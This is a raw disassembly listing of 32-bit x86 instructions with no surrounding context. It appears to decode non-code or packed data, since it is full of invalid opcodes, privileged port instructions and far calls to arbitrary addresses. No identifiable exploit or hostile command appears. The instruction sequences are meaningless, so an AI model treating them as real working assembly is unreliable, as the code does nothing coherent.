  41e77f:	aas    
  41e780:	in     al,0x55
  41e782:	and    ebp,DWORD PTR cs:[ecx-0x34]
  41e786:	shl    DWORD PTR [ebx+esi*1-0x32d4a56b],0xf0
  41e78e:	sub    BYTE PTR [esp+edi*4-0x1e],0x3b
  41e793:	xor    al,0x4f
  41e795:	imul   ebp,DWORD PTR [ecx-0xd],0x40
  41e799:	call   0xf450:0xcaba2584
  41e7a0:	mov    esi,0x506ed170
  41e7a5:	call   0xcb7eca67
  41e7aa:	repz aas 
  41e7ac:	fist   WORD PTR [ebx-0x5e]
  41e7af:	mov    cl,0x86
  41e7b1:	sub    DWORD PTR [esi],esp
  41e7b3:	ret    
  41e7b4:	fist   WORD PTR [eax+0xd]
  41e7b7:	cld    
  41e7b8:	dec    edi
  41e7b9:	repnz and BYTE PTR [ebx],0xf2
  41e7bd:	fs loope 0x41e765
  41e7c0:	jg     0x41e77e
  41e7c2:	sbb    ah,0xa6
  41e7c5:	loop   0x41e762
  41e7c7:	daa    
  41e7c8:	ret    
  41e7c9:	mov    edx,0xba031571
  41e7ce:	sub    BYTE PTR [eax],al
  41e7d0:	leave  
  41e7d1:	outs   dx,BYTE PTR ds:[esi]
  41e7d2:	jl     0x41e7a8
  41e7d4:	xlat   BYTE PTR ds:[ebx]
  41e7d5:	adc    eax,0x8d0dbd9a
  41e7da:	outs   dx,DWORD PTR ds:[esi]
  41e7db:	jns    0x41e827
  41e7dd:	add    BYTE PTR [edx],dh
  41e7df:	jle    0x41e79a
  41e7e1:	in     eax,dx
  41e7e2:	scas   al,BYTE PTR es:[edi]
  41e7e3:	push   ecx
  41e7e4:	pop    es
  41e7e5:	fs (bad) 
  41e7e7:	xchg   DWORD PTR [ecx],esi
  41e7e9:	mov    edx,DWORD PTR [edx-0x67e311bf]
  41e7ef:	imul   eax,ebx,0xf
  41e7f2:	call   0x46:0xec76f0cf
  41e7f9:	sbb    eax,esi
  41e7fb:	test   edx,edi
  41e7fd:	add    al,0x1d
  41e7ff:	imul   ecx
  41e801:	sbb    ah,dl
  41e803:	and    DWORD PTR [edi-0x16df6bb5],edx
  41e809:	and    DWORD PTR [ebp+0x19f7d18d],0x87f3fb6a
  41e813:	loopne 0x41e7d6
  41e815:	loopne 0x41e7de
  41e817:	xor    eax,DWORD PTR [esi-0x4f5f5b1f]
  41e81d:	bound  esp,QWORD PTR [edx+0x2d]
  41e820:	fwait
  41e821:	mov    gs,WORD PTR [ecx-0x79fa5608]
  41e827:	loopne 0x41e7c0
  41e829:	data16 sbb dl,BYTE PTR [edi]
  41e82c:	dec    edx
  41e82d:	loopne 0x41e7c0
  41e82f:	inc    edx
  41e830:	pusha  
  41e831:	inc    esp
  41e832:	mov    ecx,0xbec31ad5
  41e837:	out    0x36,eax
  41e839:	loope  0x41e7d3
  41e83b:	mov    cl,0x13
  41e83d:	mov    al,ds:0xd1071215
	...
  41e8b2:	add    BYTE PTR [eax],al
  41e8b4:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	(bad)  
  41e8c2:	rcl    DWORD PTR [esi+eax*4-0x9fffeb8],cl
  41e8c9:	add    BYTE PTR [eax],al
  41e8cb:	add    BYTE PTR [esi],ah
  41e8cd:	scas   al,BYTE PTR es:[edi]
  41e8ce:	lods   al,BYTE PTR ds:[esi]
  41e8cf:	imul   bx,WORD PTR ds:0xb40c5bed,0xe539
  41e8d8:	jl     0x41e8a6
  41e8da:	xor    edi,ecx
  41e8dc:	pop    ecx
  41e8dd:	stos   DWORD PTR es:[edi],eax
  41e8de:	jp     0x41e901
  41e8e0:	mov    ebp,0xc7c5bcd8
  41e8e5:	scas   eax,DWORD PTR es:[edi]
  41e8e6:	mov    edx,0xdba6b4c5
  41e8eb:	inc    esi
  41e8ec:	mov    eax,0x9c71bc41
  41e8f1:	dec    ebp
  41e8f2:	not    BYTE PTR [ecx+eax*4-0x7d]
  41e8f6:	mov    edx,0x47ec1fa4
  41e8fb:	loop   0x41e917
  41e8fd:	std    
  41e8fe:	call   0x29d7:0x10205f3e
  41e905:	ror    edx,1
  41e907:	mov    WORD PTR [ebx-0x39f14c91],ss
  41e90d:	xchg   ecx,eax
  41e90e:	(bad)  
  41e910:	aaa    
  41e911:	popf   
  41e912:	sbb    edx,edi
  41e914:	adc    WORD PTR [ebp-0x3ec09081],ax
  41e91b:	jecxz  0x41e89e
  41e91d:	mov    edi,0x2256cf3c
  41e922:	dec    edx
  41e923:	jp     0x41e953
  41e925:	fwait
  41e926:	jg     0x41e8d5
  41e928:	push   es
  41e929:	mov    edi,0xa8e61b9a
  41e92e:	jae    0x41e90f
  41e930:	(bad)  
  41e931:	loop   0x41e990
  41e933:	call   0xfe63:0x4200fb60
  41e93a:	lods   eax,DWORD PTR ds:[esi]
  41e93b:	xchg   esi,eax
  41e93c:	or     eax,0x278a558b
  41e941:	cmp    eax,0xd55b0401
  41e946:	leave  
  41e947:	inc    ecx
  41e948:	jbe    0x41e91a
  41e94a:	add    BYTE PTR [ebp+0x3846073b],0xb4
  41e951:	int3   
  41e952:	jge    0x41e920
  41e954:	lea    esi,[esi+0x6a8a48]
  41e95a:	das    
  41e95b:	mov    dl,dh
  41e95d:	retf   0x4948
  41e960:	fisub  WORD PTR [ebx+eax*4+0x15e1b500]
  41e967:	out    dx,al
  41e968:	and    eax,0xd6578ddf
  41e96d:	push   eax
  41e96e:	leave  
  41e96f:	push   ebp
  41e970:	int    0x79
  41e972:	fnsave [esi-0x3202c818]
  41e978:	cmp    cl,BYTE PTR [eax-0x46]
  41e97b:	sbb    bh,ch
  41e97d:	push   es
  41e97e:	stos   BYTE PTR es:[edi],al
  41e97f:	jbe    0x41e92b
  41e981:	mov    esi,0x5e9cab0a
  41e986:	inc    ebx
  41e987:	repz std 
  41e989:	dec    ebx
  41e98a:	xor    eax,0x90f6b31f
  41e98f:	fwait
  41e990:	cld    
  41e991:	cmp    edi,DWORD PTR [edi+0x2a7565e4]
  41e997:	sahf   
  41e998:	mov    esp,0x8216bcd9
  41e99d:	push   0xffffff8a
  41e99f:	out    dx,al
  41e9a0:	repz ss fwait
  41e9a3:	fwait
  41e9a4:	lds    ecx,FWORD PTR [ebx]
  41e9a6:	push   edx
  41e9a7:	ficomp DWORD PTR [edi-0x70c726fd]
  41e9ad:	mov    ecx,DWORD PTR [edi-0x66]
  41e9b0:	and    al,0x26
  41e9b2:	(bad)  
  41e9b4:	or     al,0xae
  41e9b6:	(bad)  
  41e9b7:	popa   
  41e9b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b9:	or     esi,0xffffffd1
  41e9bc:	inc    eax
  41e9bd:	mov    ah,cl
  41e9bf:	cmc    
  41e9c0:	fdivr  DWORD PTR [eax+0x0]
	...
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	(bad)  [edi]
  41ea41:	ja     0x41e9cd
  41ea43:	les    edi,FWORD PTR [ecx+ecx*2+0x1]
  41ea47:	add    dh,dh
  41ea49:	add    BYTE PTR [eax],al
  41ea4b:	add    ch,ah
  41ea4d:	stos   BYTE PTR es:[edi],al
  41ea4e:	xchg   BYTE PTR [esi],ch
  41ea50:	jno    0x41ea83
  41ea52:	xor    DWORD PTR [ebp+eiz*1+0x21],ecx
  41ea56:	cmp    al,0x1d
  41ea58:	add    dh,BYTE PTR [esi+0x52a6e894]
  41ea5e:	xchg   esp,eax
  41ea5f:	jge    0x41ea19
  41ea61:	leave  
  41ea62:	pop    edi
  41ea63:	pop    ebp
  41ea64:	mov    al,ds:0x61d51b4
  41ea69:	(bad)  
  41ea6a:	in     eax,dx
  41ea6b:	mov    ds:0xcbfd1ec0,al
  41ea70:	dec    eax
  41ea71:	das    
  41ea72:	push   ss
  41ea73:	mov    ah,0x7e
  41ea75:	push   esi
  41ea76:	rol    bl,1
  41ea78:	adc    BYTE PTR [edx+eiz*2],dh
  41ea7b:	jg     0x41ea3e
  41ea7d:	rcr    bh,cl
  41ea7f:	sti    
  41ea80:	xor    BYTE PTR ds:0xba21bac,bl
  41ea86:	dec    ebx
  41ea87:	mov    ebx,0x494d7bcd
  41ea8c:	stc    
  41ea8d:	fs dec ebp
  41ea8f:	hlt    
  41ea90:	add    BYTE PTR [eax-0x5936026b],dh
  41ea96:	icebp  
  41ea97:	mov    ah,0x47
  41ea99:	fisttp WORD PTR [edi-0x50]
  41ea9c:	jmp    0x41eabf
  41ea9e:	xor    bh,BYTE PTR [ebp-0x16]
  41eaa1:	pop    edi
  41eaa2:	add    dl,BYTE PTR [esi+0x60]
  41eaa5:	and    DWORD PTR [eax-0xd],edx
  41eaa8:	push   ds
  41eaa9:	(bad)  
  41eaaa:	cmp    ebp,ebp
  41eaac:	xor    DWORD PTR [ebp+0x47],0x45a79b83
  41eab3:	int3   
  41eab4:	xor    al,0x99
  41eab6:	mov    dl,0xd7
  41eab8:	fidivr DWORD PTR [ebp+ecx*4-0x1bf1c859]
  41eabf:	daa    
  41eac0:	enter  0xd42b,0x67
  41eac4:	inc    esp
  41eac5:	cmp    al,0xc1
  41eac7:	xchg   edx,eax
  41eac8:	pusha  
  41eac9:	inc    eax
  41eaca:	test   eax,edx
  41eacc:	xor    BYTE PTR [ebx+ecx*8-0x3ee564e],0x3d
  41ead4:	xor    eax,0x5a2f8273
  41ead9:	addps  xmm7,XMMWORD PTR [eax+0x47]
  41eadd:	adc    bl,ch
  41eadf:	inc    esi
  41eae0:	mov    ds:0x97ed73e3,al
  41eae5:	test   eax,0x598d850
  41eaea:	mov    edi,0xb46df1cd
  41eaef:	jae    0x41eafb
  41eaf1:	ffreep st(6)
  41eaf3:	push   0xffffffe7
  41eaf5:	jp     0x41eb0e
  41eaf7:	sub    eax,DWORD PTR [ebx+0x66]
  41eafa:	pusha  
  41eafb:	inc    edi
  41eafc:	push   edx
  41eafd:	not    DWORD PTR [ebx]
  41eaff:	sbb    BYTE PTR [ecx],dh
  41eb01:	bound  ebx,QWORD PTR [edi+0x64c83dda]
  41eb07:	fwait
  41eb08:	stos   DWORD PTR es:[edi],eax
  41eb09:	jnp    0x41eb08
  41eb0b:	mov    edi,0x81c01eff
  41eb10:	xchg   ebp,eax
  41eb11:	call   0x799d:0x7ad98e76
  41eb18:	les    ebx,FWORD PTR [edx]
  41eb1a:	jo     0x41eb28
  41eb1c:	push   ebx
  41eb1d:	mov    esi,0x2348ecd2
  41eb22:	jnp    0x41eba1
  41eb24:	(bad)  
  41eb27:	ins    DWORD PTR es:[edi],dx
  41eb28:	out    0x47,eax
  41eb2a:	mov    cl,0x5f
  41eb2c:	xchg   ebp,eax
  41eb2d:	mov    cx,0x603d
  41eb31:	fild   QWORD PTR [ecx-0x45]
  41eb34:	cs out 0x42,eax
  41eb37:	jl     0x41eb33
  41eb39:	bswap  ebx
  41eb3b:	inc    eax
  41eb3c:	or     eax,0xc15326d2
  41eb41:	adc    BYTE PTR [eax],al
	...
  41ebb3:	add    BYTE PTR [edi-0x36],ch
  41ebb6:	adc    eax,0xefdfb598
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	ss mov edx,0x4a72befa
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	test   BYTE PTR [eax],0x0
  41ebcb:	add    BYTE PTR [ebp-0x796093c8],bh
  41ebd1:	(bad)  
  41ebd2:	in     eax,dx
  41ebd3:	push   cs
  41ebd4:	imul   DWORD PTR [ebx+0x13]
  41ebd7:	data16 rcr BYTE PTR [edx],1
  41ebda:	sahf   
  41ebdb:	or     ebp,DWORD PTR [esi+0x56]
  41ebde:	scas   eax,DWORD PTR es:[edi]
  41ebdf:	cmc    
  41ebe0:	rcr    BYTE PTR [edx+0x35],1
  41ebe3:	pop    esp
  41ebe4:	mov    dl,0xcd
  41ebe6:	(bad)  
  41ebe7:	fdivp  st(5),st
  41ebe9:	xchg   ebp,eax
  41ebea:	aaa    
  41ebeb:	(bad)  
  41ebec:	popf   
  41ebed:	shl    BYTE PTR [ecx+0x28],0x9b
  41ebf1:	and    BYTE PTR [edi],ah
  41ebf3:	jno    0x41ec55
  41ebf5:	xor    ebp,ebx
  41ebf7:	inc    edi
  41ebf8:	dec    BYTE PTR [ecx+0x1f]
  41ebfb:	pusha  
  41ebfc:	clc    
  41ebfd:	das    
  41ebfe:	or     al,0x83
  41ec00:	enter  0x655b,0x56
  41ec04:	out    0xec,eax
  41ec06:	cld    
  41ec07:	ret    0x110b
  41ec0a:	jne    0x41ec79
  41ec0c:	in     al,dx
  41ec0d:	fimul  DWORD PTR [ecx+esi*1-0x443dd0d6]
  41ec14:	arpl   sp,cx
  41ec16:	imul   DWORD PTR [ecx-0x5b143992]
  41ec1c:	cs push edx
  41ec1e:	test   ch,ah
  41ec20:	sbb    BYTE PTR [edi+0x15],dl
  41ec23:	xchg   esp,eax
  41ec24:	shr    DWORD PTR [eax+0x7f],cl
  41ec27:	inc    esi
  41ec28:	pop    ebx
  41ec29:	arpl   WORD PTR [ebx],cx
  41ec2b:	inc    esp
  41ec2c:	std    
  41ec2d:	or     DWORD PTR [esi-0x54d11777],ebp
  41ec33:	daa    
  41ec34:	jbe    0x41ec99
  41ec36:	sub    al,bh
  41ec38:	pop    edi
  41ec39:	loope  0x41ebbd
  41ec3b:	retf   
  41ec3c:	mov    ah,0x85
  41ec3e:	cmp    BYTE PTR ds:0xddb19519,cl
  41ec44:	mov    cl,0xea
  41ec46:	in     eax,0x27
  41ec48:	repz or al,bh
  41ec4b:	push   edx
  41ec4c:	je     0x41ebff
  41ec4e:	retf   0xcda5
  41ec51:	mov    ebx,DWORD PTR [ecx+0x45]
  41ec54:	or     eax,0xace47fec
  41ec59:	adc    al,0x85
  41ec5b:	cmp    BYTE PTR [esi],dl
  41ec5d:	or     ebx,DWORD PTR [esi-0x41062a64]
  41ec63:	cwde   
  41ec64:	jns    0x41ec4b
  41ec66:	mov    WORD PTR [ecx+0x40],?
  41ec69:	push   edi
  41ec6a:	jmp    0x41ec45
  41ec6c:	lds    edx,FWORD PTR [ecx+esi*8-0xd984ce8]
  41ec73:	push   ecx
  41ec74:	inc    ebx
  41ec75:	mov    ebx,0xcf92350d
  41ec7b:	inc    ecx
  41ec7c:	lahf   
  41ec7d:	sub    BYTE PTR [ecx+0x4eeaa225],dh
  41ec83:	push   ebp
  41ec84:	fiadd  WORD PTR [esi-0x3b298ade]
  41ec8a:	loop   0x41ec67
  41ec8c:	mov    DWORD PTR [ecx],ecx
  41ec8e:	mov    esp,0x991075c3
  41ec93:	aam    0xf3
  41ec95:	in     eax,dx
  41ec96:	xor    BYTE PTR [esi-0x4e],cl
  41ec99:	arpl   WORD PTR [eax+0x15740bb3],ax
  41ec9f:	push   0x77
  41eca1:	outs   dx,DWORD PTR ds:[esi]
  41eca2:	pop    edi
  41eca3:	(bad)  
  41eca4:	cli    
  41eca5:	scas   eax,DWORD PTR es:[edi]
  41eca6:	nop
  41eca7:	sbb    dl,al
  41eca9:	loop   0x41ed0c
  41ecab:	ja     0x41ecb9
  41ecad:	fdiv   DWORD PTR [esi-0x312233a2]
  41ecb3:	hlt    
  41ecb4:	lahf   
  41ecb5:	fnstsw WORD PTR [esi]
  41ecb7:	or     ebx,esi
  41ecb9:	push   ecx
  41ecba:	adc    al,0xa5
  41ecbc:	je     0x41ec48
  41ecbe:	mov    WORD PTR [edx-0x3f],ss
  41ecc1:	das    
	...
  41ed32:	add    BYTE PTR [eax],al
  41ed34:	and    bl,dh
  41ed36:	das    
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	jg     0x41ecf9
  41ed42:	sbb    al,0x3e
  41ed44:	push   0xf600014b
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    dh,al
  41ed4d:	div    DWORD PTR [edi-0x4e]
  41ed50:	sub    BYTE PTR [esi+0x5f],cl
  41ed53:	cli    
  41ed54:	jg     0x41ecd6
  41ed56:	nop
  41ed57:	xchg   ecx,eax
  41ed58:	pop    ebx
  41ed59:	aaa    
  41ed5a:	push   esp
  41ed5b:	out    dx,al
  41ed5c:	das    
  41ed5d:	sub    edx,ecx
  41ed5f:	dec    ebx
  41ed60:	test   ah,0x1f
  41ed63:	test   BYTE PTR [ecx+0x1112210b],0xc9
  41ed6a:	dec    eax
  41ed6b:	fs pop edi
  41ed6d:	pop    ebp
  41ed6e:	mov    WORD PTR [ecx],?
  41ed70:	addr16 sub al,0x36
  41ed73:	adc    al,0xc7
  41ed75:	or     eax,0x9bce15c4
  41ed7a:	test   eax,0x22f65b34
  41ed7f:	and    BYTE PTR [ecx-0xe],0x2e
  41ed83:	add    cl,dh
  41ed85:	mov    ch,0xdd
  41ed87:	shr    DWORD PTR [ecx+0x7474e33f],cl
  41ed8d:	cmp    DWORD PTR [eax+edx*8-0x1],ebp
  41ed91:	sub    BYTE PTR [edi],dh
  41ed93:	fs xchg ebx,eax
  41ed95:	adc    ecx,DWORD PTR [ebx+0x262ed0b6]
  41ed9b:	push   ss
  41ed9c:	sahf   
  41ed9d:	mov    ds:0x32e27a6a,eax
  41eda2:	jmp    0x4ca05b99
  41eda7:	pop    es
  41eda8:	pop    es
  41eda9:	fmul   DWORD PTR [edx]
  41edab:	mov    ebx,DWORD PTR [ebx+0x3a7c8cf5]
  41edb1:	cmp    BYTE PTR [ebx],bh
  41edb3:	test   DWORD PTR [edi-0x6195ddfc],eax
  41edb9:	aaa    
  41edba:	sbb    edx,DWORD PTR [eax]
  41edbc:	mov    cl,0x1d
  41edbe:	and    edx,esi
  41edc0:	ins    BYTE PTR es:[edi],dx
  41edc1:	dec    edx
  41edc2:	jmp    0x37b4:0x41f54039
  41edc9:	sbb    BYTE PTR es:[ebp-0x5845f5bc],bl
  41edd0:	jmp    0x6cb0:0xde1e82fc
  41edd7:	pop    ebp
  41edd8:	add    dh,al
  41edda:	inc    edi
  41eddb:	jge    0x41ee55
  41eddd:	mov    bl,0xdd
  41eddf:	cmp    BYTE PTR gs:[esi],ch
  41ede2:	cld    
  41ede3:	pop    ebp
  41ede4:	popa   
  41ede5:	stos   BYTE PTR es:[edi],al
  41ede6:	mov    ebp,0x7b5b632f
  41edeb:	cld    
  41edec:	loopne 0x41ee5d
  41edee:	xor    DWORD PTR [eax],ebp
  41edf0:	adc    BYTE PTR [edx+0x1],0xf6
  41edf4:	dec    ebx
  41edf5:	(bad)  
  41edf6:	mov    ch,0x6c
  41edf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf9:	xchg   DWORD PTR [edx+ecx*1],edx
  41edfc:	add    ebp,DWORD PTR [ebx+0x5c]
  41edff:	inc    esi
  41ee00:	push   ecx
  41ee01:	outs   dx,DWORD PTR ds:[esi]
  41ee02:	jmp    0x6fe4:0xb84c08b0
  41ee09:	in     al,dx
  41ee0a:	mov    ebx,0xd8c52d9a
  41ee0f:	(bad)  
  41ee10:	and    al,BYTE PTR [esi+0x22]
  41ee13:	add    al,0xd5
  41ee15:	cmp    dh,BYTE PTR ds:0x1b21bde1
  41ee1b:	or     DWORD PTR ds:[ebx+0x2ecdb2bf],eax
  41ee22:	sahf   
  41ee23:	adc    DWORD PTR [edx+eiz*2+0x44],edi
  41ee27:	pushf  
  41ee28:	repnz mov edi,esp
  41ee2b:	jl     0x41ee66
  41ee2d:	or     BYTE PTR [ecx],ch
  41ee2f:	cld    
  41ee30:	into   
  41ee31:	xchg   ebx,eax
  41ee32:	pop    ss
  41ee33:	addr16 xchg ebx,eax
  41ee35:	and    eax,edx
  41ee37:	mov    dl,BYTE PTR ds:0x42318fec
  41ee3d:	lods   eax,DWORD PTR ds:[esi]
  41ee3e:	ja     0x41edcf
  41ee40:	or     eax,0x9a
	...
  41eeb1:	add    BYTE PTR [eax],al
  41eeb3:	add    BYTE PTR [edi],bh
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	jbe    0x41eee3
  41eec2:	cwde   
  41eec3:	lea    ebx,[esi+0x4c]
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	test   BYTE PTR [eax],0x0
  41eecb:	add    BYTE PTR [ebx],bh
  41eecd:	cdq    
  41eece:	add    BYTE PTR [esi+0x344356e0],dh
  41eed4:	push   0xffffffd3
  41eed6:	pop    ds
  41eed7:	leave  
  41eed8:	push   edx
  41eed9:	push   ds
  41eeda:	in     eax,0xf0
  41eedc:	sbb    esp,edi
  41eede:	inc    ebp
  41eedf:	mov    esp,0xda12389c
  41eee4:	xchg   edx,eax
  41eee5:	and    eax,0xac139fe6
  41eeea:	and    al,0xe3
  41eeec:	lahf   
  41eeed:	xor    cl,BYTE PTR [ebx+0x6dcc91df]
  41eef3:	call   0x8bd488b4
  41eef8:	xor    ch,ah
  41eefa:	adc    eax,0xd385c4f
  41eeff:	dec    eax
  41ef00:	sbb    DWORD PTR [ecx-0x38a392c9],edx
  41ef06:	jmp    0x593d00d6
  41ef0b:	add    eax,0x75b45a7d
  41ef10:	xlat   BYTE PTR ds:[ebx]
  41ef11:	sub    bh,bh
  41ef13:	dec    ebp
  41ef14:	es cmp eax,0x5cb2b2f2
  41ef1a:	scas   eax,DWORD PTR es:[edi]
  41ef1b:	ins    BYTE PTR es:[edi],dx
  41ef1c:	xor    ecx,DWORD PTR [ecx+0x22dca1d6]
  41ef22:	adc    DWORD PTR [ecx-0x2f],esp
  41ef25:	pop    ecx
  41ef26:	dec    edi
  41ef27:	add    BYTE PTR [ebx+0x6a90120c],dh
  41ef2d:	fwait
  41ef2e:	push   esp
  41ef2f:	push   cs
  41ef30:	call   0xebf2:0x4d7f7234
  41ef37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef38:	jmp    0x41ef52
  41ef3a:	adc    al,0x1c
  41ef3c:	jl     0x41ef84
  41ef3e:	ror    BYTE PTR [edi-0x63],1
  41ef41:	push   ss
  41ef42:	mov    cs,WORD PTR [ebp*2-0x576bd6a4]
  41ef49:	jne    0x41efb5
  41ef4b:	add    eax,esp
  41ef4d:	mov    al,0x49
  41ef4f:	add    edi,edx
  41ef51:	ins    DWORD PTR es:[edi],dx
  41ef52:	mov    ch,0x3
  41ef54:	(bad)  
  41ef55:	xchg   esp,eax
  41ef56:	dec    edx
  41ef57:	cmp    al,0xb1
  41ef59:	aad    0xe4
  41ef5b:	aam    0x60
  41ef5d:	jae    0x41eefe
  41ef5f:	dec    ebp
  41ef60:	xlat   BYTE PTR ds:[ebx]
  41ef61:	sahf   
  41ef62:	or     al,0x7f
  41ef64:	xchg   edx,eax
  41ef65:	jno    0x41ef66
  41ef67:	fnstcw WORD PTR [ebx-0x27ed66b9]
  41ef6d:	fdivr  DWORD PTR [edi]
  41ef6f:	push   eax
  41ef70:	jp     0x41efbe
  41ef72:	lock out 0x17,eax
  41ef75:	out    dx,eax
  41ef76:	mov    DWORD PTR [edx-0x61],eax
  41ef79:	out    0x18,eax
  41ef7b:	push   ss
  41ef7c:	stc    
  41ef7d:	in     eax,0x86
  41ef7f:	mov    esi,0xed2a4a00
  41ef84:	cli    
  41ef85:	or     ecx,DWORD PTR [ecx-0x778a1953]
  41ef8b:	mov    esp,0x9a1205d7
  41ef90:	stos   DWORD PTR es:[edi],eax
  41ef91:	add    ecx,edx
  41ef93:	cdq    
  41ef94:	call   0xdc62:0xf2a24783
  41ef9b:	cmp    ebp,ebp
  41ef9d:	ret    
  41ef9e:	and    eax,0x27ee099d
  41efa3:	test   ebp,edi
  41efa5:	ror    DWORD PTR [eax-0x5d8a2266],0xfe
  41efac:	repnz leave 
  41efae:	xor    esi,DWORD PTR [eax]
  41efb0:	jne    0x41ef81
  41efb2:	push   cs
  41efb3:	popf   
  41efb4:	das    
  41efb5:	push   eax
  41efb6:	jmp    0xfe5edcf0
  41efbb:	mov    ah,0xb6
  41efbd:	dec    ebp
  41efbe:	sub    BYTE PTR [ebp-0x70],dl
  41efc1:	lods   eax,DWORD PTR ds:[esi]
	...
  41f032:	add    BYTE PTR [eax],al
  41f034:	dec    edi
  41f035:	push   ebx
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4+0x6f]
  41f041:	xchg   ecx,eax
  41f042:	cs jmp 0x433d9c
  41f048:	test   BYTE PTR [eax],0x0
  41f04b:	add    BYTE PTR [edi-0x3d],bl
  41f04e:	and    edx,DWORD PTR [esi+0x6f]
  41f051:	adc    esi,DWORD PTR [esi+0xc46e826]
  41f057:	or     al,0xd7
  41f059:	pop    ss
  41f05a:	mov    ebx,DWORD PTR [edi]
  41f05c:	retf   0x8716
  41f05f:	and    edx,ebp
  41f061:	arpl   WORD PTR [edi],bx
  41f063:	add    BYTE PTR [ebx-0x3c],al
  41f066:	xchg   edi,eax
  41f067:	xchg   esp,eax
  41f068:	or     eax,0x6d1694f7
  41f06d:	test   BYTE PTR [ebp+esi*8-0x34],ch
  41f071:	clc    
  41f072:	mov    ah,0x32
  41f074:	push   ecx
  41f075:	inc    edx
  41f076:	xchg   esp,eax
  41f077:	test   dh,bh
  41f079:	lds    edi,FWORD PTR [eax-0x91646b3]
  41f07f:	mov    ch,BYTE PTR [edx+0x31]
  41f082:	cmc    
  41f083:	stc    
  41f084:	or     ah,cl
  41f086:	lds    ebx,FWORD PTR [ecx]
  41f088:	and    eax,0x9eeb52e
  41f08d:	sar    ch,cl
  41f08f:	hlt    
  41f090:	inc    esi
  41f091:	dec    ebx
  41f092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f093:	jle    0x41f02c
  41f095:	adc    BYTE PTR [ecx+0x7a646a4e],ah
  41f09b:	lahf   
  41f09c:	or     al,0x1
  41f09e:	sub    eax,0xa1082f9e
  41f0a3:	sub    eax,0xdc09d699
  41f0a8:	bound  ebp,QWORD PTR [ebx+0x5d]
  41f0ab:	nop
  41f0ac:	or     DWORD PTR ds:0x92518148,esi
  41f0b2:	dec    ebp
  41f0b3:	mov    bh,0x10
  41f0b5:	add    DWORD PTR [edx],esp
  41f0b7:	lahf   
  41f0b8:	dec    ebp
  41f0b9:	in     eax,dx
  41f0ba:	mov    bl,BYTE PTR [ecx+0x253f9dd]
  41f0c0:	leave  
  41f0c1:	or     al,BYTE PTR [ebx+0x35]
  41f0c4:	mov    bh,0x98
  41f0c6:	ja     0x41f0d0
  41f0c8:	iret   
  41f0c9:	cdq    
  41f0ca:	je     0x41f130
  41f0cc:	cmp    BYTE PTR [ebp+0x50],bh
  41f0cf:	ins    DWORD PTR es:[edi],dx
  41f0d0:	or     DWORD PTR [eax+0x59],edi
  41f0d3:	cmc    
  41f0d4:	or     edx,DWORD PTR [ebx-0x3e1072e8]
  41f0da:	enter  0xe46b,0x44
  41f0de:	ss pop edi
  41f0e0:	dec    eax
  41f0e1:	shr    DWORD PTR ds:[eax-0x7547482],0xb9
  41f0e9:	test   BYTE PTR [edx+0x4c],dh
  41f0ec:	imul   eax,DWORD PTR [edx],0x67
  41f0ef:	in     eax,0x34
  41f0f1:	pop    ss
  41f0f2:	jecxz  0x41f165
  41f0f4:	push   eax
  41f0f5:	sub    ebx,DWORD PTR [eax+0x79]
  41f0f8:	cs mov edx,0xdcc5e8cb
  41f0fe:	loopne 0x41f102
  41f100:	and    eax,ebp
  41f102:	arpl   dx,dx
  41f104:	gs dec esp
  41f106:	mov    esi,0xc814cc03
  41f10b:	xchg   ebx,eax
  41f10c:	mov    ds:0xcb4ebf04,al
  41f111:	and    al,0xa2
  41f113:	jmp    0x4f08f48
  41f118:	mov    esp,0x29338f9b
  41f11d:	ds xor al,0xf7
  41f120:	fsub   QWORD PTR [ecx+ebx*4]
  41f123:	ja     0x41f0fc
  41f125:	xor    cl,BYTE PTR [eax-0x78]
  41f128:	mov    al,0xe7
  41f12a:	jae    0x41f166
  41f12c:	xchg   ebx,eax
  41f12d:	stos   DWORD PTR es:[edi],eax
  41f12e:	push   0xe25d9579
  41f133:	gs js  0x41f0e2
  41f136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f137:	inc    eax
  41f138:	mov    DWORD PTR [eax+0x3],edx
  41f13b:	(bad)  
  41f13c:	and    dl,BYTE PTR [esi]
  41f13e:	in     eax,0x5d
  41f140:	icebp  
  41f141:	lods   al,BYTE PTR ds:[esi]
	...
  41f1b2:	add    BYTE PTR [eax],al
  41f1b4:	stos   DWORD PTR es:[edi],eax
  41f1b5:	add    dh,BYTE PTR [edi-0x1a]
  41f1b8:	push   edi
  41f1ba:	mov    ebx,0xee13144f
  41f1bf:	mov    DWORD PTR [esi+0x13],edx
  41f1c2:	sahf   
  41f1c3:	and    eax,0x14e4a
  41f1c8:	test   BYTE PTR [eax],0x0
  41f1cb:	add    bh,bh
  41f1cd:	shr    BYTE PTR [eax+0xd74969f],cl
  41f1d3:	jo     0x41f22a
  41f1d5:	push   ss
  41f1d6:	cwde   
  41f1d7:	outs   dx,BYTE PTR ds:[esi]
  41f1d8:	ja     0x41f1ac
  41f1da:	and    BYTE PTR [eax-0x35dc52d3],0x55
